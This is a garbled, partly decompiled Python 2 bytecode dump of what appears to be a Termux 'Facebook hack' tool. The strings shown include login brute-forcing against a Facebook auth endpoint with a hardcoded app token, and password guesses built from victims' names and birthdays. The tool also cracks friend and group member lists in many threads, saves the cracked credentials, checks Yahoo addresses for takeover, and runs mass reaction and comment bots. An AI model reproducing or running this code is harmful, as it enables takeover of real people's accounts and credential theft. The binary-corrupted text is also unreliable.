 r&qhXqhW| j   d d GHd GHd t t  GHt d  }
 t  j d d  |
  d! |
 GHt d  t   Wn t k
 r¶d" GHt d  t   nu t t f k
 râd# GHt d  t   nI t k
 rd$ GHt d  t   n# t j  j! k
 r*d% GHt"   n Xd  S(&   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   Rs   s2   [1;91m[+] [1;92mInput ID friend [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m Rh   s   [1;91m[!] Friend not founds   
[1;91m[ [1;97mBack [1;91m]s   /friends?access_token=s@   [1;91m[âº] [1;92mGet all friend number from friend [1;97m...i*   s
   [1;97mâs   out/no_teman_from_teman.txtR   Re   Rb   R{   s   
s   [1;97m[ [1;92ms   [1;97m ][1;97m=> [1;97ms    | g-Cëâ6?sF   [1;91m[[1;96mâ[1;91m] [1;92mSuccessfully get number [1;97m....s2   [1;91m[+] [1;92mTotal Number [1;91m: [1;97m%ss7   [1;91m[+] [1;92mSave file with name[1;91m :[1;97m s   out/s2   [1;91m[+] [1;92mFile saved [1;91m: [1;97mout/s   [1;91m[!] Error creating files   [1;91m[!] Stoppeds   [1;91m[!] Errors   [1;91m[â] No connection(#   R#   R$   RF   Rl   RI   R   R   R-   R   R   R*   R+   RY   RZ   R[   R\   R]   RH   Rv   R   t   hpfromtemanR   R   R   R
   R   R   R   R^   R   R   R   R`   R   R,   (   Ra   R   R   R   R0   Rf   R   R   R   R   R   (    (    s   /sdcard/hal.pyR   s  s    

	0  
		






c          C   s    t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd GHd	 GHd
 GHd GHd GHd GHt	   d  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   sN   [1;93mâ--[1;93m> [1;93m1.[1;94m Mini Hack Facebook([1;92mTarget[1;97m)s?   [1;93mâ--[1;93m> [1;93m2.[1;94m Multi Bruteforce FacebooksE   [1;93mâ--[1;93m> [1;93m3.[1;94m Super Multi Bruteforce FacebooksF   [1;93mâ--[1;93m> [1;93m4.[1;94m BruteForce([1;92mTarget[1;97m)s3   [1;93mâ--[1;93m> [1;93m5.[1;94m Yahoo Checkers*   [1;93mâ--[1;93m> [1;93m0.[1;94m Backs   â(
   R#   R$   RF   Rl   RI   R   R   R-   R*   t
   hack_pilih(   Ra   (    (    s   /sdcard/hal.pyRw   ´  s$    c          C   sÂ   t  d  }  |  d k r' d GHt   n |  d k r= t   n |  d k rZ t   t   nd |  d k rp t   nN |  d k r t   n8 |  d k r t   n" |  d	 k r² t   n d GHt   d  S(
   Ns   [1;95mââ[1;95mD [1;95mR   s   [1;91m[!] Wrong inputR'   R(   Rn   Ro   Rp   R)   (	   R+   R¨   t   minit   crackt   hasilt   supert   brutet
   menu_yahooRG   (   t   hack(    (    s   /sdcard/hal.pyR¨   È  s&    






c          C   s	  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd d	 GHy[t	 d
  } t
 d  t j d | d |   } t j | j  } d | d GHt
 d  t j d  t
 d  t j d  d d	 GH| d d } t j d | d | d  } t j |  } d | k rd GHd | d GHd | GHd | GHt	 d  t   nPd | d k r×d GHd  GHd | d GHd | GHd | GHt	 d  t   n| d d! } t j d | d | d  } t j |  } d | k rWd GHd | d GHd | GHd | GHt	 d  t   nd | d k r¤d GHd  GHd | d GHd | GHd | GHt	 d  t   n6| d" d } t j d | d | d  } t j |  } d | k r$d GHd | d GHd | GHd | GHt	 d  t   n¶d | d k rqd GHd  GHd | d GHd | GHd | GHt	 d  t   ni| d# }	 |	 j d$ d%  }
 t j d | d |
 d  } t j |  } d | k rÿd GHd | d GHd | GHd |
 GHt	 d  t   nÛd | d k rLd GHd  GHd | d GHd | GHd |
 GHt	 d  t   n| d# } | j d$ d%  } | d | } t j d | d | d  } t j |  } d | k rèd GHd | d GHd | GHd | GHt	 d  t   nòd | d k r5d GHd  GHd | d GHd | GHd | GHt	 d  t   n¥d& } t j d | d | d  } t j |  } d | k r­d GHd | d GHd | GHd | GHt	 d  t   n-d | d k rúd GHd  GHd | d GHd | GHd | GHt	 d  t   nà d' } t j d | d | d  } t j |  } d | k rrd GHd | d GHd | GHd | GHt	 d  t   nh d | d k r¿d GHd  GHd | d GHd | GHd | GHt	 d  t   n d( GHd) GHt	 d  t   Wn' t k
 rd* GHt	 d  t   n Xd  S(+   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   se   [1;97m[[1;91mINFO[1;97m] [1;91mThe target account must be friends
       with your account first!i*   s
   [1;97mâs,   [1;91m[+] [1;92mTarget ID [1;91m:[1;97m s,   [1;91m[âº] [1;92mWait a minute [1;97m...s   https://graph.facebook.com/s   ?access_token=s"   [1;91m[â¹] [1;92mName[1;97m : Rh   s"   [1;91m[+] [1;92mCheck [1;97m...i   s*   [1;91m[+] [1;92mOpen password [1;97m...t
   first_namet   123s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RD   s   [1;91m[+] [1;92mFounds4   [1;91m[[1;96mâ[1;91m] [1;92mName[1;97m     : s&   [1;91m[â¹] [1;92mUsername[1;97m : s&   [1;91m[â¹] [1;92mPassword[1;97m : s   
[1;91m[ [1;97mBack [1;91m]s   www.facebook.comt	   error_msgs$   [1;91m[!] [1;93mAccount Checkpointt   12345t	   last_nameR}   t   /R   t	   kontol123t	   sayang123s7   [1;91m[!] Sorry, failed to open the target password :(s   [1;91m[!] try it another way.s   [1;91m[!] Terget not found(   R#   R$   RF   Rl   RI   R   R   R-   R*   R+   R   RY   RZ   R[   R\   R]   t   urllibt   urlopent   loadRw   R   RH   (   Ra   Rb   R0   Rf   t   pz1Re   Ri   t   pz2t   pz3t   lahirt   pz4t   lahirst   gazt   pz5t   pz6t   pz7(    (    s   /sdcard/hal.pyR©   ß  s@   	


			

		

		

		

		

		


		

		


		

		

		

		

		

		



c          C   s6  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHt	 d  a
 t	 d  a y~ t t
 d  a t d	  xC t d
  D]5 } t j d t d d  } | j   t j |  q³ Wx t D] } | j   qó WWn' t k
 r1d GHt	 d  t   n Xd  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s+   [1;91m[+] [1;92mFile ID  [1;91m: [1;97ms+   [1;91m[+] [1;92mPassword [1;91m: [1;97ms$   [1;91m[âº] [1;92mStart [1;97m...i(   t   targett   argss   [1;91m[!] File not founds   
[1;91m[ [1;97mBack [1;91m](    (   R#   R$   RF   Rl   RI   R   R   R-   R*   R+   t   idlistt   passwt   fileR   t   ranget	   threadingt   Threadt   scrakt   startt   threadsR   t   joinRw   (   Ra   R   Rg   (    (    s   /sdcard/hal.pyRª     s2    


c    	      C   sg  y t  j d  Wn t k
 r$ n Xyýt t d  }  |  j   j   a xÕt r t j	   j
   } d | d t d } t j |  } t j |  } t t t  k r® Pn  d | k rEt d d  } | j | d	 t d
  | j   t j d | d | d  } t j | j  } t j d | d	 t d | d  nu d | d k r£t d d  } | j | d	 t d
  | j   t j d | d	 t  n t j |  t d 7a t j j d t t  d t t t   d t t t   d t t t    t j j   qL WWn> t  k
 rGd GHt! j" d  n t j# j$ k
 rbd GHn Xd  S(   NRs   R0   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RD   s   out/mbf_ok.txtR   t   |s   
s   https://graph.facebook.com/s   ?access_token=s   [1;97m[ [1;92mOKâ[1;97m ] s    =>Rh   s   www.facebook.comR²   s   out/mbf_cp.txts   [1;97m[ [1;93mCPâ[1;97m ] i   s<   [1;91m[[1;96mâ¸[1;91m] [1;92mCrack    [1;91m:[1;97m s    [1;96m>[1;97m s    =>[1;92mLive[1;91m:[1;96ms%    [1;97m=>[1;93mCheck[1;91m:[1;96ms   
[1;91m[!] Sleeps   [1;91m[â] No connection(%   R#   R   R   RF   RÇ   Rl   t   splitt   upRÉ   t   readlinet   stripRÈ   R¸   R¹   R[   Rº   t   backR
   R   R^   RY   RZ   R\   R]   t   berhasilR   t   cekpointt   gagalR   R   R   R   RI   R   R   R`   R   (	   t   bukat   usernameRd   Re   t   mpsht   bisaR   R   t   cek(    (    s   /sdcard/hal.pyRÍ   ®  sF    	
(

V c          C   s_   Hd d GHx t  D] }  |  GHq Wx t D] } | GHq' Wd d GHd t t t   GHt   d  S(   Ni*   s
   [1;97mâs   [31m[x] Failed [1;97m--> (   R×   RØ   R   R
   RÙ   R,   (   t   bt   c(    (    s   /sdcard/hal.pyR«   Ô  s    				c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHt
   d  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s<   [1;95mâ--[1;91m> [1;96m1.[1;93m Crack with list friends7   [1;95mâ--[1;91m> [1;96m2.[1;93m Crack from friends=   [1;95mâ--[1;91m> [1;96m3.[1;93m Crack from member groups*   [1;95mâ--[1;91m> [1;96m0.[1;93m Backs   â(   R#   R$   RF   Rl   Ra   RI   R   R   R-   R*   t   pilih_super(    (    (    s   /sdcard/hal.pyR¬   ã  s     c          C   s  t  d  }  |  d k r' d GHt   n||  d k r t j d  t GHt d  t j d t  } t	 j
 | j  } x,| d D] } t j | d	  q Wn|  d
 k rt j d  t GHt  d  } y> t j d | d t  } t	 j
 | j  } d | d GHWn' t k
 r.d GHt  d  t   n Xt d  t j d | d t  } t	 j
 | j  } x:| d D] } t j | d	  qqWn|  d k rt j d  t GHt  d  } y> t j d | d t  } t	 j
 | j  }	 d |	 d GHWn' t k
 r d GHt  d  t   n Xt d  t j d | d t  }
 t	 j
 |
 j  } xH | d D] } t j | d	  qcWn" |  d k rt   n d GHt   d t t t   GHt d  d d  d! g } x0 | D]( } d" | Gt j j   t j d#  qØWHd$ d% GHd&   } t d'  } | j | t  d$ d% GHd( GHd) t t t   d* t t t   GHd+ GHt  d  t   d  S(,   Ns   [1;97mââ[1;91mD [1;97mR   s   [1;91m[!] Wrong inputR'   R"   s0   [1;94m[âº] [1;96mGet all friend id [1;95m...s3   https://graph.facebook.com/me/friends?access_token=Re   Rb   R(   s2   [1;91m[+] [1;92mInput ID friend [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m Rh   s   [1;91m[!] Friend not founds   
[1;91m[ [1;97mBack [1;91m]s5   [1;91m[âº] [1;92mGet all id from friend [1;97m...s   /friends?access_token=Rn   s1   [1;91m[+] [1;92mInput ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96mâ[1;91m] [1;92mFrom group [1;91m:[1;97m s   [1;91m[!] Group not founds2   [1;91m[âº] [1;92mGet group member id [1;97m...s5   /members?fields=name,id&limit=999999999&access_token=R)   s+   [1;91m[+] [1;92mTotal ID [1;91m: [1;97ms$   [1;91m[âº] [1;92mStart [1;97m...s   .   s   ..  s   ... s0   [1;91m[[1;96mâ¸[1;91m] [1;92mCrack [1;97mi   i*   s
   [1;97mâc         S   s  |  } y t  j d  Wn t k
 r* n Xy\t j d | d t  } t j | j  } | d d } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d | d | d | d GHt j | |  nd | d k r[t d d  }	 |	 j | d | d  |	 j   t j | |  n+| d d }
 t	 j
 d | d |
 d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d | d |
 d | d GHt j | |
  nd | d k r[t d d  }	 |	 j | d |
 d  |	 j   t j | |
  n+| d d } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d | d | d | d GHt j | |  nd | d k r[t d d  }	 |	 j | d | d  |	 j   t j | |  n+| d } | j d d  } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d | d | d | d GHt j | |  nsd | d k rit d d  }	 |	 j | d | d  |	 j   t j | |  nd } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d | d | d | d GHt j | |  n{d | d k rat d d  }	 |	 j | d | d  |	 j   t j | |  n%d } t	 j
 d | d | d  } t j |  } d	 | k rt j d | d
 | d	  } t j | j  } d | d | d | d GHt j | |  nd | d k rYt d d  }	 |	 j | d | d  |	 j   t j | |  n-t j d | d t  } t j | j  } | d d } t	 j
 d | d | d  } t j |  } d	 | k r0t j d | d
 | d	  } t j | j  } d | d | d | d GHt j | |  nV d | d k rt d d  }	 |	 j | d | d  |	 j   t j | |  n  Wn n Xd  S(   NRs   s   https://graph.facebook.com/s   /?access_token=R°   R±   s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RD   s   ?access_token=s   [1;93m[ [1;93mOKâ[1;93m ] s    ð s    =>Rh   s   www.facebook.comR²   s   out/super_cp.txtRf   RÑ   s   
R³   R´   R}   Rµ   R   R·   R¶   t   doraemon321(   R#   R   R   RY   RZ   Ra   R[   R\   R]   R¸   R¹   Rº   t   oksR   RF   R   R^   RØ   R   (   t   argt   userRf   Rß   t   pass1Re   R   R   R   RÞ   t   pass2t   pass3R¾   t   pass4t   pass5t   pass6t   pass7(    (    s   /sdcard/hal.pyt   main5  sÐ    







i   s2   [1;91m[[1;96mâ[1;91m] [1;92mDone [1;97m....s.   [1;91m[+] [1;92mTotal OK/CP [1;91m: [1;92ms   [1;97m/[1;93ms@   [1;91m[+] [1;92mCP File saved [1;91m: [1;97mout/super_cp.txt(   R+   Rá   R#   R$   R*   R   RY   RZ   Ra   R[   R\   R]   Rb   R   RH   R¬   Rw   R   R
   R   R   R   R   R   R    t   mapRã   RØ   (   t   peakR0   R   R    R   R   R   R   t   idgR   R   t   pR   R    Rí   (    (    s   /sdcard/hal.pyRá   ö  s    







  			)
c    	      C   s  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHyùt
 d  }  t
 d  } t | d  } | j   } d	 d
 GHd |  GHd t t |   d GHt d  t | d  } x{| D]s} yA| j d d  } t j j d |  t j j   t j d |  d | d  } t j | j  } d | k rÈt d d  } | j |  d | d  | j   d GHd	 d
 GHd |  GHd | GHt   nq d | d k r9t d d  } | j |  d | d  | j   d GHd	 d
 GHd GHd |  GHd | GHt   n  Wqó t j j k
 red  GHt j d  qó Xqó WWn t k
 rd! GHt   n Xd  S("   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   sX   [1;91m[+] [1;92mID[1;97m/[1;92mEmail[1;97m/[1;92mHp [1;97mTarget [1;91m:[1;97m s@   [1;91m[+] [1;92mWordlist [1;97mext(list.txt) [1;91m: [1;97mi*   s
   [1;97mâs9   [1;91m[[1;96mâ[1;91m] [1;92mTarget [1;91m:[1;97m s   [1;91m[+] [1;92mTotal[1;96m s    [1;92mPasswords$   [1;91m[âº] [1;92mStart [1;97m...s   
R   s9   [1;91m[[1;96mâ¸[1;91m] [1;92mCrack [1;91m: [1;97ms   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RD   s	   Brute.txtR   s    | s   
[1;91m[+] [1;92mFounds-   [1;91m[â¹] [1;92mUsername [1;91m:[1;97m s-   [1;91m[â¹] [1;92mPassword [1;91m:[1;97m s   www.facebook.comR²   s   Brutecekpoint.txts$   [1;91m[!] [1;93mAccount Checkpoints   [1;91m[!] Connection Errors   [1;91m[!] File not found(   R#   R$   RF   Rl   Ra   RI   R   R   R-   R*   R+   t	   readlinesR   R
   R   R   R   R   R   R   RY   RZ   R[   R\   R]   R^   R,   R`   R   t   tanyaw(	   R2   RÈ   t   totalt   sandit   pwRe   RÜ   t   dapatt   ceks(    (    s   /sdcard/hal.pyR­   Á  sh    		

			

			c          C   s   t  d  }  |  d k r' d GHt   nd |  d k r= t   nN |  d k rS t   n8 |  d k ri t   n" |  d k r t   n d GHt   d  S(   Ns@   [1;91m[?] [1;92mCreate wordlist ? [1;92m[y/n][1;91m:[1;97m R   s   [1;91m[!] WrongRi   t   YR¦   t   N(   R+   Ró   t   wordlistRw   (   t   why(    (    s   /sdcard/hal.pyRó   ÷  s    




c           C   s   t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd GHd GHd	 GHd
 GHd GHd GHt
   d  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s6   [1;97mâ--[1;91m> [1;92m1.[1;97m With list friends7   [1;97mâ--[1;91m> [1;92m2.[1;97m Clone from friends=   [1;97mâ--[1;91m> [1;92m3.[1;97m Clone from member groups0   [1;97mâ--[1;91m> [1;92m4.[1;97m Using files*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   â(   R#   R$   RF   Rl   Ra   RI   R   R   R-   R*   t   yahoo_pilih(    (    (    s   /sdcard/hal.pyR®   
  s"    c          C   s¥   t  d  }  |  d k r' d GHt   nz |  d k r= t   nd |  d k rS t   nN |  d k ri t   n8 |  d k r t   n" |  d k r t   n d GHt   d  S(	   Ns   [1;97mââ[1;91mD [1;97mR   s   [1;91m[!] WrongR'   R(   Rn   Ro   R)   (   R+   Rý   t   yahoofriendst   yahoofromfriendst   yahoomembert	   yahoolistRw   (   t   go(    (    s   /sdcard/hal.pyRý     s     





c          C   sµ  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHg  }  d } t d	  t j d
 t  } t j | j  } t d d  } t d  d d GHxw| d D]k} | d 7} |  j |  | d } | d } t j d | d t  } t j | j  }	 yù |	 d }
 t j d  } | j |
  j   } d | k rUt j d  t t j _ t j d d  |
 t d <t j   j   } t j d  } y | j |  j   } Wn
 wÿ n Xd | k rU| j |
 d  d |
 d | GHt j |
  qUn  Wqÿ t k
 riqÿ Xqÿ Wd d GHd  GHd! t  t! t   GHd" GH| j"   t# d#  t$   d  S($   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   Rs   i    s3   [1;91m[âº] [1;92mGetting email friend [1;97m...s3   https://graph.facebook.com/me/friends?access_token=s   out/MailVuln.txtR   s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mâRe   Rb   Rh   s   https://graph.facebook.com/s   ?access_token=R2   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR1   RÛ   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   
s(   [1;97m[ [1;92mVULNâ[1;97m ] [1;92ms
    [1;97m=>s2   [1;91m[[1;96mâ[1;91m] [1;92mDone [1;97m....s(   [1;91m[+] [1;92mTotal [1;91m: [1;97ms=   [1;91m[+] [1;92mFile saved [1;91m:[1;97m out/MailVuln.txts   
[1;91m[ [1;97mBack [1;91m](%   R#   R$   RF   Rl   Ra   RI   R   R   R-   R   R   R*   R   RY   RZ   R[   R\   R]   R   R   t   compilet   searcht   groupRK   RN   RO   RP   RQ   RS   R   R×   RH   R   R
   R^   R+   R®   (   RÜ   t   jmlt   temant   kimakt   saveR   Rb   Rk   t   linksR   t   mailt   yahooRj   t   klikR   t   pek(    (    s   /sdcard/hal.pyRþ   2  sr    

	




	

c          C   s1  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHg  }  d } t d	  } y> t j d
 | d t  } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt d  t j d
 | d t  } t j | j  } t d d  } t d  d d GHxw| d D]k} | d 7} |  j |  | d }	 | d }
 t j d
 |	 d t  } t j | j  } yù | d } t j d  } | j |  j   } d | k rÑt j d  t t j _ t j d d  | t d <t j   j   } t j d  } y | j |  j   } Wn
 w{n Xd  | k rÑ| j  | d!  d" | d# |
 GHt! j |  qÑn  Wq{t k
 råq{Xq{Wd d GHd$ GHd% t" t# t!   GHd& GH| j$   t d  t   d  S('   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   Rs   i    s2   [1;91m[+] [1;92mInput ID friend [1;91m: [1;97ms   https://graph.facebook.com/s   ?access_token=s7   [1;91m[[1;96mâ[1;91m] [1;92mFrom[1;91m :[1;97m Rh   s   [1;91m[!] Friend not founds   
[1;91m[ [1;97mBack [1;91m]s8   [1;91m[âº] [1;92mGetting email from friend [1;97m...s   /friends?access_token=s   out/FriendMailVuln.txtR   s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mâRe   Rb   R2   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR1   RÛ   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   
s(   [1;97m[ [1;92mVULNâ[1;97m ] [1;92ms
    [1;97m=>s2   [1;91m[[1;96mâ[1;91m] [1;92mDone [1;97m....s(   [1;91m[+] [1;92mTotal [1;91m: [1;97msC   [1;91m[+] [1;92mFile saved [1;91m:[1;97m out/FriendMailVuln.txt(%   R#   R$   RF   Rl   Ra   RI   R   R   R-   R   R   R*   R+   RY   RZ   R[   R\   R]   RH   R®   R   R   R   R  R  R  RK   RN   RO   RP   RQ   RS   R   R×   R   R
   R^   (   RÜ   R  R   R   R   R  R  R	  R   Rb   Rk   R
  R   R  R  Rj   R  R  (    (    s   /sdcard/hal.pyRÿ   o  s    


	




	

c          C   s1  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHg  }  d } t d	  } y> t j d
 | d t  } t j | j  } d | d GHWn' t k
 rd GHt d  t   n Xt d  t j d | d t  } t j | j  } t d d  } t d  d d GHxw| d D]k} | d 7} |  j |  | d } | d }	 t j d | d t  }
 t j |
 j  } yù | d } t j d  } | j |  j   } d | k rÑt j d  t t j _ t j d d  | t d  <t j   j   } t j d!  } y | j |  j   } Wn
 w{n Xd" | k rÑ| j  | d#  d$ | d% |	 GHt! j |  qÑn  Wq{t k
 råq{Xq{Wd d GHd& GHd' t" t# t!   GHd( GH| j$   t d  t   d  S()   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   Rs   i    s1   [1;91m[+] [1;92mInput ID group [1;91m:[1;97m s%   https://graph.facebook.com/group/?id=s   &access_token=s=   [1;91m[[1;96mâ[1;91m] [1;92mFrom group [1;91m:[1;97m Rh   s   [1;91m[!] Group not founds   
[1;91m[ [1;97mBack [1;91m]s7   [1;91m[âº] [1;92mGetting email from group [1;97m...s   https://graph.facebook.com/s5   /members?fields=name,id&limit=999999999&access_token=s   out/GrupMailVuln.txtR   s$   [1;91m[âº] [1;92mStart [1;97m...i*   s
   [1;97mâRe   Rb   s   ?access_token=R2   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR1   RÛ   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s   
s(   [1;97m[ [1;92mVULNâ[1;97m ] [1;92ms
    [1;97m=>s2   [1;91m[[1;96mâ[1;91m] [1;92mDone [1;97m....s(   [1;91m[+] [1;92mTotal [1;91m: [1;97msA   [1;91m[+] [1;92mFile saved [1;91m:[1;97m out/GrupMailVuln.txt(%   R#   R$   RF   Rl   Ra   RI   R   R   R-   R   R   R*   R+   RY   RZ   R[   R\   R]   RH   R®   R   R   R   R  R  R  RK   RN   RO   RP   RQ   RS   R   R×   R   R
   R^   (   RÜ   R  Rb   R0   R   R  R  R	  R   Rk   R
  R   R  R  Rj   R  R   R  (    (    s   /sdcard/hal.pyR   µ  s    


	




	

c          C   s  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xy t  j	 d  Wn t
 k
 r n Xt  j d  t GHt d  }  y t |  d  } | j   } Wn' t k
 rë d	 GHt d
  t   n Xg  } d } t d  t d d  } d d GHt |  d  j   } x| D]} | j d d  } | d 7} | j |  t j d  } | j |  j   } d | k r6t j d  t t j _ t j d d  | t d <t j   j   }	 t j d  }
 y |
 j |	  j   } Wn
 q6n Xd | k rH| j | d  d | GHt j |  qHq6q6Wd d GHd GHd t t t   GHd GH| j    t d
  t   d  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   Rs   s,   [1;91m[+] [1;92mFile path [1;91m: [1;97ms   [1;91m[!] File not founds   
[1;91m[ [1;97mBack [1;91m]i    s$   [1;91m[âº] [1;92mStart [1;97m...s   out/FileMailVuln.txtR   i*   s
   [1;97mâs   
R   s   @.*s	   yahoo.coms_   https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.comR1   RÛ   s$   "messages.ERROR_INVALID_USERNAME">.*s"   "messages.ERROR_INVALID_USERNAME">s(   [1;97m[ [1;92mVULNâ[1;97m ] [1;92ms2   [1;91m[[1;96mâ[1;91m] [1;92mDone [1;97m....s(   [1;91m[+] [1;92mTotal [1;91m: [1;97msA   [1;91m[+] [1;92mFile saved [1;91m:[1;97m out/FileMailVuln.txt(!   R#   R$   RF   Rl   Ra   RI   R   R   R-   R   R   R*   R+   Rò   R®   R   R   R   R   R  R  R  RK   RN   RO   RP   RQ   RS   R   R×   R   R
   R^   (   t   filesRô   R  RÜ   R  R	  Rö   R  Rj   R  R   R  (    (    s   /sdcard/hal.pyR  û  sp    

	

		

c          C   sª   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd GHd	 GHd
 GHd GHd GHd GHd GHd GHt	   d  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s?   [1;97mâ--[1;91m> [1;92m1.[1;97m Bot Reactions Target Posts=   [1;97mâ--[1;91m> [1;92m2.[1;97m Bot Reactions Grup Posts;   [1;97mâ--[1;91m> [1;92m3.[1;97m Bot Komen Target Posts9   [1;97mâ--[1;91m> [1;92m4.[1;97m Bot Komen Grup Posts6   [1;97mâ--[1;91m> [1;92m5.[1;97m Mass delete Posts8   [1;97mâ--[1;91m> [1;92m6.[1;97m Mass accept friends8   [1;97mâ--[1;91m> [1;92m7.[1;97m Mass delete friends*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   â(
   R#   R$   RF   Rl   RI   R   R   R-   R*   t	   bot_pilih(   Ra   (    (    s   /sdcard/hal.pyRx   :  s(    c          C   sç   t  d  }  |  d k r' d GHt   n¼ |  d k r= t   n¦ |  d k rS t   n |  d k ri t   nz |  d k r t   nd |  d k r t   nN |  d	 k r« t   n8 |  d
 k rÁ t   n" |  d k r× t	   n d GHt   d  S(   Ns   [1;97mââ[1;91mD [1;97mR   s   [1;91m[!] Wrong inputR'   R(   Rn   Ro   Rp   Rq   Rr   R)   (
   R+   R  t
   menu_reactt
   grup_reactt	   bot_koment
   grup_koment
   deletepostt   acceptt   unfriendRG   (   t   bots(    (    s   /sdcard/hal.pyR  P  s,    








c          C   s¥   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd GHd GHd	 GHd
 GHd GHd GHd GHd GHt	   d  S(   NR"   s	   login.txtR0   s   [1;91m[!] Token not founds   rm -rf login.txti   s*   [1;97mâ--[1;91m> [1;92m1. [1;97mLikes*   [1;97mâ--[1;91m> [1;92m2. [1;97mLoves)   [1;97mâ--[1;91m> [1;92m3. [1;97mWows*   [1;97mâ--[1;91m> [1;92m4. [1;97mHahas,   [1;97mâ--[1;91m> [1;92m5. [1;97mSadBoys+   [1;97mâ--[1;91m> [1;92m6. [1;97mAngrys*   [1;97mâ--[1;91m> [1;91m0.[1;97m Backs   â(
   R#   R$   RF   Rl   RI   R   R   R-   R*   t   react_pilih(   Ra   (    (    s   /sdcard/hal.pyR  j  s&    c          C   sõ   t  d  }  |  d k r' d GHt   nÊ |  d k rC d a t   n® |  d k r_ d a t   n |  d k r{ d	 a t   nv |  d
 k r d a t   nZ |  d k r³ d a t   n> |  d k rÏ d a t   n" |  d k rå t   n d GHt   d  S(   Ns   [1;97mââ[1;91mD [1;97mR   s   [1;91m[!] Wrong inputR'   t   LIKER(   t   LOVERn   t   WOWRo   t   HAHARp   t   SADRq   t   ANGRYR)   (   R+   R  t   tipet   reactRx   (   t   aksi(    (    s   /sdcard/hal.pyR    s4    







c          C   s¥  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHt	 d  } t	 d  } yí t
 j d	 | d
 | d |   } t j | j  } t d  d d GHxo | d d D]_ } | d } t j |  t
